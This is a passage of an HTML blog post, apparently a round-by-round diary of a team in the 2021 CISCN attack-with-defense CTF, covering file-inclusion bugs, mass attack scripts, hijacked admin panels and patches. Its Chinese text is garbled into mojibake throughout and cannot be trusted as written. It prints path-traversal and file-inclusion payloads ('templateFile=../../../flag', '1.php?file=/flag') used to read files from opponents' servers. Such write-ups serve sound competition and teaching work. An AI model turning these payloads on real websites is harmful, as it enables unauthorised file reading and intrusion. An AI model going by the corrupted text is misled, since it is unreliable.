href="#æ—¶é—´ï¼šæ¯”èµ›æ—¶-èµ›å†µ" class="headerlink" title="æ—¶é—´ï¼šæ¯”èµ›æ—¶ - èµ›å†µ"></a>æ—¶é—´ï¼šæ¯”èµ›æ—¶ - èµ›å†µ</h3><h4 id="8-30å·¦å³-æœªå¼€èµ›"><a href="#8-30å·¦å³-æœªå¼€èµ›" class="headerlink" title="8:30å·¦å³ - æœªå¼€èµ›"></a>8:30å·¦å³ - æœªå¼€èµ›</h4><p>å‡†å¤‡å¥½è®¾å¤‡ï¼Œæˆ‘å¸¦äº†ä¸¤å°ç”µè„‘ï¼Œä¸€å°ç”µè„‘æ’ä¸Šç½‘çº¿ï¼Œå¼€wifiï¼Œå¦ä¸€å°ç”µè„‘è¿æ¥ã€‚ç”±äºm1çš„armæ¶æ„é—®é¢˜ï¼Œæœ‰äº›äº‹æƒ…ä¸å¾—ä¸åœ¨windowsä¸Šåšï¼Œæ¯”å¦‚Dç›¾æ‰«æä¹‹ç±»çš„ï¼Œä¸ºé˜²æ­¢çº çº·æˆ‘ä¸¤å°ç”µè„‘éƒ½è¿›è¡Œäº†å½•å±ã€‚</p><h4 id="9-00-ç¬¬1è½®"><a href="#9-00-ç¬¬1è½®" class="headerlink" title="9:00 - ç¬¬1è½®"></a>9:00 - ç¬¬1è½®</h4><p>å¼€å§‹æ¯”èµ›ï¼Œé¶æœºå…¨éƒ¨ç”¨sshç§é’¥è¿æ¥ï¼Œä¸å­˜åœ¨ç¯¡æ”¹å¯†ç çš„æƒ…å†µã€‚</p><p>ç¬¬ä¸€æ‰¹2é“webä¸¤é“pwnã€‚ä»¥ipæ ‡å·å‘½åï¼Œ<code>11/12</code> æ˜¯webï¼Œ<code>13/15</code>æ˜¯pwn</p><img src="/article/2021ciscnawd/image-20210620165959278.png" class="" title="image-20210620165959278" loading="lazy"><p>ä»å·¦åˆ°å³ä¾æ¬¡æ˜¯11-17</p><p>ä¸Šæ¥æˆ‘ä»¬ä¸‰ä½webå¸ˆå‚…é¦–å…ˆä¸‹è½½ssh</p><pre class="language-none"><code class="language-none">safecms --&gt; 172.35.xx.11:80,eyou --&gt; 172.35.xx.12:80,decoder --&gt; 172.35.xx.13:9999,cryptopark --&gt; 172.35.xx.14:9999,eval --&gt; 172.35.xx.15:9999,secgame --&gt; 172.35.xx.16:9999,lol --&gt; 172.35.xx.17:80</code></pre><img src="/article/2021ciscnawd/image-20210620173025274.png" class="" title="image-20210620173025274" loading="lazy"><p>ä¸€çœ‹å°±æ˜¯3webï¼Œ4pwnã€‚å¯¼å…¥å¯†é’¥åå‘ç°æ€ä¹ˆéƒ½è¿ä¸ä¸Šï¼Œè¿‡äº†ä¸€æ®µæ—¶é—´ï¼Œä¸»åŠæ–¹é€šçŸ¥ æœ‰äº›é¶æœºæ²¡æœ‰å¯åŠ¨æˆåŠŸï¼Œæ­£åœ¨å¯åŠ¨ï¼Œæœ‰é—®é¢˜ä¸¾æ‰‹ç¤ºæ„ã€‚ç¦»è°±çš„æ˜¯ï¼Œå¤§å®¶éƒ½æ²¡è¿ä¸Šï¼ŒæŸå­¦æ ¡ç¬¬ä¸€è½®å·²ç»å‘ç°æ¼æ´å¹¶å†™å¥½è„šæœ¬æ‰“äº†å…¨åœºçš„åˆ†ï¼Œç‹¬å é³Œå¤´ã€‚</p><p>ç¬¬ä¸€è½®ç”±äºé¶æœºæœªå¯åŠ¨æˆåŠŸï¼Œæ‰€ä»¥check downäº†ï¼Œæ— è¯­ã€‚</p><img src="/article/2021ciscnawd/image-20210620210522286.png" class="" title="image-20210620210522286" loading="lazy"><h4 id="9-10-ç¬¬2è½®-ç›´æ¥è¿›æ”»"><a href="#9-10-ç¬¬2è½®-ç›´æ¥è¿›æ”»" class="headerlink" title="9:10 - ç¬¬2è½® - ç›´æ¥è¿›æ”»"></a>9:10 - ç¬¬2è½® - ç›´æ¥è¿›æ”»</h4><p>æ—è¾¹webå¸ˆå‚…è¿æ¥æˆåŠŸï¼Œä¸Šå»åé¦–å…ˆæŒ‚äº†logå’Œæ–‡ä»¶ç›‘æ§ï¼Œç„¶åæ‹–ä¸‹æ¥æºç å¼€å§‹æ‰«ã€‚</p><img src="/article/2021ciscnawd/upload_df544a9bb4d1a8a99073e4f878056ce0.png" class="" title="img" loading="lazy"><p>ç›´æ¥å‘ç°æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œå¦‚ä¸‹</p><img src="/article/2021ciscnawd/image-20210620190953385.png" class="" title="image-20210620190953385" loading="lazy"><p>è°ƒç”¨showæ–¹æ³•ï¼Œç›´æ¥å¯ä»¥æ–‡ä»¶åŒ…å«<code>/flag</code></p><img src="/article/2021ciscnawd/image-20210620191059855.png" class="" title="image-20210620191059855" loading="lazy"><p>Payload:</p><pre class="language-none"><code class="language-none">.&#x2F;wap&#x2F;Common&#x2F;show?templateFile&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag</code></pre><p>å¼€å§‹å†™è„šæœ¬å…¨åœºæ‰“ï¼Œä¹‹å‰é¢„å…ˆå†™å¥½çš„æäº¤flagè„šæœ¬é’ˆå¯¹çš„æ˜¯Dæ®µçš„ï¼Œæ”¹æˆCæ®µæµªè´¹äº†ç‚¹æ—¶é—´ã€‚</p><img src="/article/2021ciscnawd/image-20210620193200148.png" class="" title="image-20210620193200148" loading="lazy"><p>ç„¶åç›´çº¿ä¸Šåˆ†ï¼Œé è¿™ä¸€æ­¥ç¨³æ­¥åœ¨äº†ç¬¬5åã€‚æˆ‘ä»¬å°†æ­¤å¤„è°ƒç”¨ç›´æ¥æ³¨é‡Šï¼ŒæˆåŠŸé˜²å¾¡å’Œcheckã€‚11è¢«æ‰“åˆ°äº†ç¬¬3è½®ã€‚</p><p>æ­¤æ—¶12ï¼Œ13ï¼Œ15è¿˜æ²¡æœ‰äººå‡ºï¼Œæˆ‘ä»¬å¼€å§‹åˆ†ææºç æŒ–æ´ã€‚</p><img src="/article/2021ciscnawd/image-20210622155449870.png" class="" title="image-20210622155449870" loading="lazy"><p>ä¸Šé€šé˜²çš„ç»™é€®åˆ°äº†å§</p><h4 id="9-30å·¦å³-ç¬¬4-5è½®"><a href="#9-30å·¦å³-ç¬¬4-5è½®" class="headerlink" title="9:30å·¦å³ - ç¬¬4-5è½®"></a>9:30å·¦å³ - ç¬¬4-5è½®</h4><p>å‘ç°æˆ‘ä»¬çš„æœåŠ¡ç›´æ¥å°±checkdownäº†ï¼Œç»ç¡®è®¤ï¼Œå‘ç°æ˜¯wafå’Œå¥—å£³çš„åŸå› ï¼Œæˆ‘ä»¬ä¸‹æ‰äº†wafå’Œå£³</p><img src="/article/2021ciscnawd/image-20210620211053690.png" class="" title="image-20210620211053690" loading="lazy"><p>12è¢«æ‰£20åˆ†ï¼Œ15è¢«æ‰£10åˆ†</p><h4 id="9-50å·¦å³-ç¬¬6-9è½®"><a href="#9-50å·¦å³-ç¬¬6-9è½®" class="headerlink" title="9:50å·¦å³ - ç¬¬6-9è½®"></a>9:50å·¦å³ - ç¬¬6-9è½®</h4><img src="/article/2021ciscnawd/image-20210620212448430.png" class="" title="down" loading="lazy"><p>å‘ç°12å¤§é‡å®•æœºï¼Œè­¦æƒ•</p><p>ç¬¬9è½®ï¼Œè¿›åˆ°äº†ç¬¬ä¸‰å</p><img src="/article/2021ciscnawd/image-20210620212907416.png" class="" title="image-20210620212907416" loading="lazy"><h4 id="10-30å·¦å³-ç¬¬10è½®-pwné¢˜ä¸€è¡€"><a href="#10-30å·¦å³-ç¬¬10è½®-pwné¢˜ä¸€è¡€" class="headerlink" title="10:30å·¦å³ - ç¬¬10è½® - pwné¢˜ä¸€è¡€"></a>10:30å·¦å³ - ç¬¬10è½® - pwné¢˜ä¸€è¡€</h4><img src="/article/2021ciscnawd/image-20210620213129362.png" class="" title="image-20210620213129362" loading="lazy"><p>pwnå…¨åœºè¢«æ”»å‡»ï¼Œå¼€å§‹åˆ†ææµé‡</p><img src="/article/2021ciscnawd/image-20210620213518653.png" class="" title="image-20210620213518653" loading="lazy"><p>pwnçˆ·åœ¨åŠªåŠ›å¤ç°</p><p>ç¬¬11è½®ï¼Œ<code>TimeKeeper</code>ç›´æ¥å‡­å€Ÿä¸€é¢˜ä¸Šäº†è¿‘700åˆ†ï¼Œæ‰“åˆ°äº†ç¬¬äºŒï¼Œæˆ‘ä»¬åˆ°äº†ç¬¬å››</p><img src="/article/2021ciscnawd/image-20210622133401466.png" class="" title="image-20210622133401466" loading="lazy"><p>pwnçˆ·æœ¬åœ°å¥—å£³å°è¯•ï¼Œå‘ç°æœ¬åœ°å¯ä»¥ï¼Œé¶æœºä¸è¡Œã€‚æ­¤æ—¶å•†é‡å¯¹ç­–ï¼Œç”±äºæˆ‘ä»¬æ’åè¾ƒä¸ºé å‰ï¼Œä¸ºå‡å°‘å·®è·ï¼Œæˆ‘ä»¬å†³å®šå®•æœºã€‚è¿™æ ·å®•æœºæ‰£10åˆ†ç»™å…¨åœºï¼Œè¢«æ‰“æ‰£10åˆ†ç»™æ‰“çš„äººï¼Œä¸å¦‚ç»™å…¨åœºï¼Œäºæ˜¯å†³å®šè‡ªè¡Œå®•æœºã€‚</p><img src="/article/2021ciscnawd/image-20210622133745484.png" class="" title="image-20210622133745484" loading="lazy"><p>pwnçˆ·é‡æ”¾å¤±è´¥ï¼Œè§‰å¾—æ˜¯æ–¹å¼é—®é¢˜ï¼Œæˆ‘ä»¬è®©ä»–ç¨³ä½ï¼Œæ…¢æ…¢æ£€æŸ¥ã€‚</p><h4 id="11-20å·¦å³-ç¬¬15è½®"><a href="#11-20å·¦å³-ç¬¬15è½®" class="headerlink" title="11:20å·¦å³ - ç¬¬15è½®"></a>11:20å·¦å³ - ç¬¬15è½®</h4><p>13è¢«æ”»å‡»</p><img src="/article/2021ciscnawd/image-20210622133904810.png" class="" title="image-20210622133904810" loading="lazy"><p>ç”±äºéƒ¨åˆ†é˜Ÿä¼é‡æ”¾æˆåŠŸï¼Œæˆ‘ä»¬æ‰åˆ°äº†ç¬¬7ã€‚æˆ‘ä»¬é¼“åŠ±pwnå¸ˆå‚…ä¼˜å…ˆé‡æ”¾ï¼Œæš‚æ—¶ä¸ç”¨ä¿®ã€‚</p><p>åŒæ—¶æˆ‘å¸®å¿™æ£€æŸ¥äº†æµé‡</p><img src="/article/2021ciscnawd/image-20210622134327938.png" class="" title="image-20210622134327938" loading="lazy"><p>æ€€ç–‘æ˜¯æ··æ·†æµé‡ï¼Œæœ€åè¯å®ä¸éœ€è¦è¿™ä¹ˆå¤æ‚ã€‚å½“æ—¶è®©pwnå¸ˆå‚…å…ˆä¿å­˜ï¼Œä¼˜å…ˆçœ‹15.</p><h4 id="11-40-ç¬¬17è½®-è¢«äººå…³ç«™"><a href="#11-40-ç¬¬17è½®-è¢«äººå…³ç«™" class="headerlink" title="11:40 - ç¬¬17è½® - è¢«äººå…³ç«™"></a>11:40 - ç¬¬17è½® - è¢«äººå…³ç«™</h4><p>ï¼ˆä¸»åŠæ–¹é€é¥­æ¥äº†ï¼‰</p><p>çªå‘çŠ¶å†µï¼Œweb2å¤§é‡å®•æœºã€‚å‘ç°ç½‘ç«™è¢«äººå…³é—­äº†ã€‚ç»ä¸»åŠæ–¹æé†’ï¼Œweb2æœ‰åå°ç®¡ç†ï¼Œå¯†ç é»˜è®¤ï¼Œè¢«äººæ‰¹é‡æ”¹äº†å¯†ç ç™»é™†åå°å…³é—­äº†ç½‘ç«™ã€‚ç½‘ç«™æ˜¾ç¤º<code>ç½‘ç«™æš‚æ—¶å…³é—­ï¼Œç»´æŠ¤ä¸­â€¦â€¦</code></p><p>é»‘ï¼ŒçœŸtmçš„é»‘å•Šã€‚</p><p>è¿˜å¥½ç½‘ç«™æœ‰å¤‡ä»½ï¼Œå°è¯•å¤åŸï¼Œå‘ç°æ— æ³•å¤åŸï¼Œæ²¡æœ‰æƒé™ã€‚</p><p>ä½†æ˜¯æ•°æ®åº“è¿˜åœ¨ï¼Œå°è¯•ä¿®æ”¹æ•°æ®åº“é‡Œçš„adminå¯†ç ï¼Œå‘ç°æ˜¯md5ï¼Œç”Ÿæˆåå‘ç°ä¸å¯¹ï¼Œå¯†ç åº”è¯¥æ˜¯åŠ ç›äº†</p><p><strong>å„æ–¹å°è¯•åï¼Œåœ¨11:45å·¦å³ï¼Œæˆ‘ä»¬å‘ä¸»åŠæ–¹ç”³è¯·äº†é‡ç½®é¶æœº12ã€‚</strong></p><p>é‡ç½®å®Œæˆåç«‹åˆ»ç™»é™†ï¼Œå¯æ˜¯äººå®¶å†™å¥½äº†æ‰¹é‡æ”»å‡»è„šæœ¬ï¼Œæˆ‘ä»¬æ²¡äººå®¶å¿«</p><img src="/article/2021ciscnawd/image-20210622135940583.png" class="" title="image-20210622135940583" loading="lazy"><p>è¿™æ—¶å€™çªå‘å¥‡æƒ³ï¼Œæœç´¢æºç </p><img src="/article/2021ciscnawd/image-20210622140242016.png" class="" title="image-20210622140242016" loading="lazy"><p>æ—¢ç„¶è¿™æœ‰åˆ¤æ–­ï¼Œé‚£å°±å¹²è„†å…¨éƒ¨æ³¨é‡Šï¼Œæˆ–è€…æŠŠ<code>0</code>æ”¹æˆ<code>1</code></p><img src="/article/2021ciscnawd/image-20210622140326152.png" class="" title="image-20210622140326152" loading="lazy"><p>ç½‘ç«™æ¢å¤äº†ï¼Œä½†è¿™æ¬¡å¤„ç†è€—è´¹äº†å¤§é‡æ—¶é—´ï¼Œæˆ‘ä»¬å·²ç»å¼€å§‹ä¹±äº†é˜µè„š</p><p>æ­¤æ—¶pwnå¸ˆå‚…é‚£å†³å®š13ä¹Ÿè‡ªè¡Œå®•æœºã€‚</p><h4 id="12-00-ç¬¬19è½®-ä¿®å¤12"><a href="#12-00-ç¬¬19è½®-ä¿®å¤12" class="headerlink" title="12:00 - ç¬¬19è½® - ä¿®å¤12"></a>12:00 - ç¬¬19è½® - ä¿®å¤12</h4><p>å±æœºè¿˜æœªè§£é™¤ï¼Œæˆ‘ä»¬å‘ç°12è¿˜æ˜¯checkdownçš„çŠ¶æ€</p><p>åŒæ—¶12ç‚¹ä¸Šäº†æ–°é¢˜ï¼Œåˆ·æ–°å‘ç°ï¼Œä¸Šäº†ä¸¤é“pwné¢˜ï¼Œpwnå¸ˆå‚…ç›´æ¥ç˜«å€’åœ¨äº†æ¤…å­ä¸Šï¼Œæˆ‘ä»¬ä¸‰ä¸ªwebå¿ƒé‡Œå‡‰äº†ä¸€æˆªï¼Œå·²ç»è®¤å®šæœ¬æ¬¡æ¯”èµ›æˆ‘ä»¬åŸºæœ¬ä¸Šå·²ç»è¾“äº†ã€‚ï¼ˆæ­¤æ—¶è¦æ˜¯ä¸Š1web1pwnä¹Ÿè®¸è¿˜æœ‰æœºä¼šï¼Œå¯æ˜¯ä¸Šäº†2pwné¢˜ï¼‰</p><p>pwnå¸ˆå‚…æ­¤æ—¶å‘ç°ä¸ä¼šé‡æ”¾æµé‡ï¼Œæ„å‘³ç€æˆ‘ä»¬pwné¢˜æ²¡æœ‰è¾“å‡ºäº†ï¼ŒåŒæ—¶å°è¯•ä¿®å¤ï¼Œå‘ç°ä¿®å¤å°±checkdownï¼Œæ„å‘³ç€æˆ‘ä»¬ç°åœ¨2web4pwnï¼Œ4pwnå®Œå…¨å°±æ˜¯é€åˆ†çš„çŠ¶æ€ï¼ŒåŸºæœ¬ä¸Šç»“å±€å·²å®šã€‚</p><p>11/12ä¸ºwebï¼Œ13/15ä¸ºpwnï¼Œ14/16ä¸ºæ–°ä¸Šçš„pwn</p><img src="/article/2021ciscnawd/image-20210622142809731.png" class="" title="image-20210622142809731" loading="lazy"><p>æˆ‘ä»¬è®©pwnå¸ˆå‚…ç¨³ä½ï¼Œä¸ç®¡ç»“æœå¦‚ä½•æˆ‘ä»¬ä¸€èµ·æ¥å—ï¼Œæ­¤æ—¶å¤§å®¶éƒ½å¿ƒçŸ¥è‚šæ˜ï¼Œå¯æ˜¯æ²¡äººæ•¢ç‚¹ç ´â€¦</p><p><strong>å³ä½¿æ³¨å®šå¤±è´¥ï¼Œæˆ‘ä»¬ä¹Ÿå¾—æˆ˜åˆ°æœ€å</strong></p><p>ç›®å‰webä»»åŠ¡ï¼šä¿®å¤å¥½12</p><p>æˆ‘å»å®¡è®¡ä»£ç </p><img src="/article/2021ciscnawd/image-20210620174753069.png" class="" title="image-20210620174753069" loading="lazy"><p>æ‰¾åˆ°äº†Adminåå°è·¯ç”±ä¸º<code>/Admin/login</code>ï¼ˆå…¶å®å®¡æµé‡èƒ½çœ‹åˆ°ï¼Œå¯æ˜¯è¢«äººæ‰“äº†æ··æ·†å¤ªæ¶å¿ƒäº†ï¼‰</p><img src="/article/2021ciscnawd/image-20210622141935947.png" class="" title="image-20210622141935947" loading="lazy"><p>åœ¨<code>application/admin/controller/Admin.php</code>ä¸‹å‘ç°éªŒè¯æ–¹å¼</p><img src="/article/2021ciscnawd/image-20210622142119360.png" class="" title="image-20210622142119360" loading="lazy"><p>è·Ÿè¿›<code>func_encrypt</code>çœ‹ï¼Œå‘ç°ç¡®å®åŠ ç›äº†ï¼Œç°åœ¨è¦æ‰¾åˆ°ä½ç½®ï¼Œç»§ç»­è·Ÿè¿›</p><img src="/article/2021ciscnawd/image-20210622142205443.png" class="" title="image-20210622142205443" loading="lazy"><p>å‘ç°åº”è¯¥å­˜åœ¨æ•°æ®åº“ä¸­ï¼Œå¹¸äºæ•°æ®åº“æœªè¢«æ”¹å¯†ç </p><img src="/article/2021ciscnawd/image-20210622142403373.png" class="" title="image-20210622142403373" loading="lazy"><p>åœ¨æ•°æ®åº“ä¸­æ‰¾åˆ°ç›</p><img src="/article/2021ciscnawd/image-20210622142613420.png" class="" title="image-20210622142613420" loading="lazy"><p>updateä¸€ä¸‹adminçš„å¯†ç ï¼ŒæˆåŠŸä¿®æ”¹æˆåŠŸï¼ŒæŠŠç½‘ç«™æ¢å¤æ­£å¸¸äº†ã€‚</p><img src="/article/2021ciscnawd/image-20210622155405384.png" class="" title="image-20210622155405384" loading="lazy"><h4 id="12-20-ç¬¬21è½®"><a href="#12-20-ç¬¬21è½®" class="headerlink" title="12:20 - ç¬¬21è½®"></a>12:20 - ç¬¬21è½®</h4><p>æˆ‘ä»¬æ‰åˆ°äº†17å</p><p>æ­¤æ—¶æ–°ä¸Šçš„14ç›´æ¥è¢«äººaæ‰äº†ï¼Œä¸è¿‡æ˜¯è¯•æ¢æ€§çš„æ‰“äº†ä¸¤ä¸ªé˜Ÿï¼Œä¸‹ä¸€è½®å°±è¦å…¨åœºæ‰“äº†</p><img src="/article/2021ciscnawd/image-20210622143135148.png" class="" title="image-20210622143135148" loading="lazy"><img src="/article/2021ciscnawd/image-20210622143251871.png" class="" title="image-20210622143251871" loading="lazy"><h4 id="13-00-ç¬¬25è½®"><a href="#13-00-ç¬¬25è½®" class="headerlink" title="13:00 - ç¬¬25è½®"></a>13:00 - ç¬¬25è½®</h4><p>ï¼ˆä¸»åŠæ–¹æç¤ºé¥­å‡‰äº†ï¼Œæˆ‘ä»¬è¿˜æ²¡åŠ¨è¿‡æ—è¾¹çš„é¥­ï¼‰</p><p>æ­¤æ—¶æ‰åˆ°äº†26å</p><p>æˆ‘å®¡è®¡14çš„æµé‡ï¼Œå‘ç°æµé‡å¾ˆç®€å•ï¼Œæ²¡æœ‰åœ°å€ç‰¹æ®Šå­—ç¬¦ç­‰ç­‰</p><img src="/article/2021ciscnawd/image-20210622143728983.png" class="" title="image-20210622143728983" loading="lazy"><p>æˆ‘å«pwnå¸ˆå‚…å…ˆçœ‹è¿™é¢˜ï¼Œæ­¤æ—¶pwnå¸ˆå‚…ç¥æƒ…ææƒš</p><h4 id="14-00-ç¬¬31è½®"><a href="#14-00-ç¬¬31è½®" class="headerlink" title="14:00 - ç¬¬31è½®"></a>14:00 - ç¬¬31è½®</h4><p>æ­¤æ—¶16è¢«äººè§£å‡ºï¼Œæˆ‘ä»¬æ‰åˆ°äº†30å</p><img src="/article/2021ciscnawd/image-20210622144130081.png" class="" title="image-20210622144130081" loading="lazy"><p>pwnå¸ˆå‚…å°è¯•ä¿®å¤14ï¼Œè¢«checkdownå¹¶è¢«æ”»å‡»</p><h4 id="14-20-ç¬¬33è½®-pwné‡æ”¾æˆåŠŸ"><a href="#14-20-ç¬¬33è½®-pwné‡æ”¾æˆåŠŸ" class="headerlink" title="14:20 - ç¬¬33è½® - pwné‡æ”¾æˆåŠŸ"></a>14:20 - ç¬¬33è½® - pwné‡æ”¾æˆåŠŸ</h4><p>pwnå¸ˆå‚…é‡æ”¾14æˆåŠŸï¼</p><img src="/article/2021ciscnawd/image-20210622144406529.png" class="" title="image-20210622144406529" loading="lazy"><p>å¼€å§‹å‡†å¤‡æ‰¹é‡æ‰“ï¼Œè¿™æ—¶å‘ç°æ‰¹é‡æ‰“è„šæœ¬æœ‰é—®é¢˜ï¼Œæ— æ³•ç»“æŸè¿æ¥ã€‚æ— å¥ˆæœ€åæˆ‘ä»¬å…¨éƒ¨æ‰‹äº¤14çš„flagä¸€ç›´äº¤åˆ°æ¯”èµ›ç»“æŸï¼Œä¸­é—´é—æ¼äº†ä¸å°‘</p><h4 id="15-00-ç¬¬37è½®-æ–°é¢˜ä¸Šåœº"><a href="#15-00-ç¬¬37è½®-æ–°é¢˜ä¸Šåœº" class="headerlink" title="15:00 - ç¬¬37è½® - æ–°é¢˜ä¸Šåœº"></a>15:00 - ç¬¬37è½® - æ–°é¢˜ä¸Šåœº</h4><img src="/article/2021ciscnawd/image-20210622145507276.png" class="" title="image-20210622145507276" loading="lazy"><p>11,12å…¨downäº†ï¼Œ16pwnå¸ˆå‚…è¿˜æ˜¯è‡ªè¡Œå®•æœº</p><p>æ­¤æ—¶ä¸Šäº†æ–°é¢˜ï¼Œä¸€é“ç®€å•webï¼Œæˆ‘ä»¬å†³å®šåŠªåŠ›ä¸€ä¸‹</p><p>ç›´æ¥å‘ç°æ–‡ä»¶åŒ…å«æ¼æ´</p><p><code>./statics/1.php?file=/flag</code></p><p>é‡Œé¢æ˜¯ä¸ªfile_get_contentsï¼Œç›´æ¥åˆ é™¤ï¼Œæˆ‘ç«‹åˆ»å†™è„šæœ¬å¼€å§‹å…¨åœºæ‰“</p><img src="/article/2021ciscnawd/image-20210622151547266.png" class="" title="image-20210622151547266" loading="lazy"><p>é¢˜ç›®åˆšä¸Šæ¥ä¸€è½®å°±æ”»å‡»æˆåŠŸï¼Œä¹Ÿæœ‰å…¶ä»–é˜Ÿå‘ç°äº†æ¼æ´ï¼Œå’Œæˆ‘ä»¬å¹³åˆ†äº†åˆ†æ•°</p><img src="/article/2021ciscnawd/image-20210622151717676.png" class="" title="image-20210622151717676" loading="lazy"><p>è¿™ä¸€æ³¢çš„ååº”æå…¶è¿…é€Ÿï¼Œå¯æ˜¯è¿˜æ˜¯æ— æ³•å¼¥è¡¥å‰é¢çš„å·®è·ã€‚ä½†æˆ‘ä»¬ä¸æƒ³æ”¾å¼ƒã€‚</p><p>å†³å®šä¸€ä½webå¸ˆå‚…ç»§ç»­å®¡è®¡17ï¼Œå¦å¤–çš„å¸ˆå‚…ä¿®11/12ï¼Œæˆ‘ç»§ç»­å®¡è®¡æµé‡ã€‚</p><h4 id="15-20-ç¬¬39è½®-å†å‡ºä¸€æ´"><a href="#15-20-ç¬¬39è½®-å†å‡ºä¸€æ´" class="headerlink" title="15:20 - ç¬¬39è½® - å†å‡ºä¸€æ´"></a>15:20 - ç¬¬39è½® - å†å‡ºä¸€æ´</h4><p>å®¡è®¡å‘ç°äº†17ç¬¬äºŒä¸ªæ´å¦‚ä¸‹</p><p><code>/index.php?g=Admin&amp;m=Public&amp;a=display&amp;templateFile=../../../../../../../../../../../../../../flag</code></p><p>ä¸11æ¨¡ç‰ˆç›¸ä¼¼ï¼Œç›´æ¥å†™è„šæœ¬å†æ‰“</p><img src="/article/2021ciscnawd/image-20210622152502255.png" class="" title="image-20210622152502255" loading="lazy"><p>ä¿®å¤æ–¹æ³•ç›´æ¥æ³¨é‡Š</p><h4 id="15-50-ç¬¬42è½®-é’ˆå¯¹check"><a href="#15-50-ç¬¬42è½®-é’ˆå¯¹check" class="headerlink" title="15:50 - ç¬¬42è½® - é’ˆå¯¹check"></a>15:50 - ç¬¬42è½® - é’ˆå¯¹check</h4><p>12ç½‘ç«™æ­£å¸¸å´checkdownï¼Œå‘ç°æ•°æ®åº“ç»™äººåˆ äº†ï¼Œå¬è¯´æ˜¯sqlæ³¨å…¥æ‰‹æ³¨ç»™äººåˆ äº†åº“ï¼Œæˆ‘ä»¬ä»…å‰©ä¸€æ¬¡é‡ç½®æœºä¼šï¼Œå†µä¸”11ç°åœ¨è¿˜åœ¨å®•æœºæ‰¾ä¸åˆ°åŸå› ã€‚</p><p>é˜Ÿé‡Œå¸ˆå‚…çµæœºä¸€åŠ¨å¼€å§‹åˆ†æï¼Œæˆ‘ä»¬å‘ç°checkæµé‡æ˜¯ç™»é™†éšæœºç”¨æˆ·ï¼Œç”¨æˆ·åå¯†ç éƒ½æ˜¯é”™çš„ï¼ŒéªŒè¯ç ä¸å¯èƒ½æ™ºèƒ½åˆ°åˆ†æéªŒè¯ç å§</p><p>æ¥è‡ª10.10.10.10çš„checkæµé‡</p><img src="/article/2021ciscnawd/image-20210622153217583.png" class="" title="image-20210622153217583" loading="lazy"><p>ç°åœ¨ç™»é™†ä¼šæ˜¾ç¤ºæ•°æ®åº“é”™è¯¯ï¼Œé‚£å°±å…¨å±€æœç´¢ï¼ŒæŠŠ<code>æ•°æ®åº“é”™è¯¯</code>æ”¹æˆäº†<code>éªŒè¯ç é”™è¯¯</code></p><img src="/article/2021ciscnawd/image-20210622154205778.png" class="" title="image-20210622154205778" loading="lazy"><h4 id="16-00-ç¬¬43è½®"><a href="#16-00-ç¬¬43è½®" class="headerlink" title="16:00 - ç¬¬43è½®"></a>16:00 - ç¬¬43è½®</h4><p>pwnå¸ˆå‚…å°è¯•ä¿®å¤14è¢«checkdownå¹¶è¢«æ”»å‡»</p><p>11ç»ç¡®è®¤è¢«äººå†™ç äº†ï¼Œå ç”¨èµ„æºç–¯ç‹‚å†™ç¼“å­˜</p><img src="/article/2021ciscnawd/image-20210622154547731.png" class="" title="image-20210622154547731" loading="lazy"><p>å®åœ¨æ˜¯ä¸çŸ¥é“æ€ä¹ˆåŠï¼Œå¦‚æœé‡ç½®çš„è¯åˆä¼šè¢«æ‰“ã€‚</p><p>pwnå¸ˆå‚…è¯´ä»–ç´¯äº†ï¼Œæ‰‹ äº¤ è¦æ´—å†…äº†</p><h4 id="16-30-ç¬¬46è½®-æ–°çš„0day"><a href="#16-30-ç¬¬46è½®-æ–°çš„0day" class="headerlink" title="16:30 - ç¬¬46è½® - æ–°çš„0day"></a>16:30 - ç¬¬46è½® - æ–°çš„0day</h4><p>12çªç„¶æŠ¥åˆè¢«æ‰“äº†ï¼Œç«‹åˆ»æŸ¥æµé‡</p> <img src="/article/2021ciscnawd/image-20210622155218748.png" class="" title="image-20210622155218748" loading="lazy"><p>ç„¶åä¸€åˆ·æ–°ä¸»é¡µå‘ç°flagå°±åœ¨ä¸»é¡µ</p><p>å’±ä»¬å°±ä¹Ÿå†™ï¼Œå¤ç°æˆåŠŸ</p><img src="/article/2021ciscnawd/image-20210622155711588.png" class="" title="image-20210622155711588" loading="lazy"><p>æœ€åä¸€å¥è¯æ²¡å†™è¿›å»ï¼Œä¸çŸ¥é“ä¸ºå•¥</p><p>ä¿®å¤å°±å†ç¼–è¾‘ä¸‹æŠŠè‡ªå·±çš„ä¸»é¡µæ¢å¤å°±è¡Œã€‚å‰ç«¯rceï¼Œæ”¶è·0dayä¸€ä¸ª</p><p>ç¬¬47è½®æƒ¨çŠ¶ç•™å¿µ</p><img src="/article/2021ciscnawd/image-20210622154927603.png" class="" title="image-20210622154927603" loading="lazy"><h4 id="17-00-ç¬¬49è½®"><a href="#17-00-ç¬¬49è½®" class="headerlink" title="17:00 - ç¬¬49è½®"></a>17:00 - ç¬¬49è½®</h4><img src="/article/2021ciscnawd/image-20210622160146600.png" class="" title="image-20210622160146600" loading="lazy"><p>pwnå¸ˆå‚…è¯´ä»–çœŸçš„ç´¯äº†ï¼Œç»™pwnå¸ˆå‚…å†™äº†ä¸ªä¸€é”®æäº¤ï¼Œè®©ä»–ç¨å¾®è½»æ¾ä¸€ç‚¹</p><img src="/article/2021ciscnawd/image-20210622160205845.png" class="" title="image-20210622160205845" loading="lazy"><h4 id="17-30-ç¬¬52è½®-å¤åŸpwné¢˜"><a href="#17-30-ç¬¬52è½®-å¤åŸpwné¢˜" class="headerlink" title="17:30 - ç¬¬52è½® - å¤åŸpwné¢˜"></a>17:30 - ç¬¬52è½® - å¤åŸpwné¢˜</h4><p>æ¯”èµ›è¿˜å‰©ä¸€ä¸ªå°æ—¶ï¼Œpwnå¸ˆå‚…å°†pwné¢˜å…¨éƒ¨å¤åŸäº†</p><img src="/article/2021ciscnawd/image-20210622161135972.png" class="" title="image-20210622161135972" loading="lazy"><p>11ä¸å‡†å¤‡ä¿®äº†ï¼Œä¸å‡†å¤‡é‡ç½®äº†ï¼Œèººå¹³äº†ã€‚</p><p>å’±å¼€äº†31ä¸ªshellå¸®pwnå¸ˆå‚…ä¸€èµ·äº¤flag</p><img src="/article/2021ciscnawd/image-20210622162019446.png" class="" title="image-20210622162019446" loading="lazy"><h4 id="18-10-ç¬¬56è½®"><a href="#18-10-ç¬¬56è½®" class="headerlink" title="18:10 - ç¬¬56è½®"></a>18:10 - ç¬¬56è½®</h4><img src="/article/2021ciscnawd/image-20210622161728291.png" class="" title="image-20210622161728291" 